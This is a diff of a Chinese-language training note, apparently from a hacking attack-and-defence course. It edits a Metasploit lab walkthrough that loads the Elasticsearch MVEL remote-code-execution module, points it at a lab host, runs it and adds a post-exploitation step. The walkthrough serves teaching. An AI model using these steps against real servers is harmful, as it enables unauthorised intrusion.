@@ -31,16 +31,18 @@
 
 - 步驟4:use exploit/multi/elasticsearch/script_mvel_rce
 ![metasploit_3.png](metasploit_3.png)
-![metasploit_4.png](metasploit_4.png)
 - 步驟5:設定攻擊參數
   - show options
   - set RHOSTS 10.0.2.4
   - show options
-![metasploit_5.png](metasploit_5.png)
+![metasploit_4.png](metasploit_4.png)
 - 步驟6:進行攻擊 ==> exploit 或者 run
+![metasploit_5.png](metasploit_5.png)
 - 步驟7:攻擊成功
-![metasploit_7.png](metasploit_7.png)
 ![metasploit_6.png](metasploit_6.png)
+- 步驟8:進入到post-exploitation階段
+![metasploit_7.png](metasploit_7.png)
+
 # B.駭客攻防實戰營(2):如何阻擋駭客攻擊?
 ### 你必須要知道的Windows作業系統常用工具
 - 工作管理員(TaksManager)
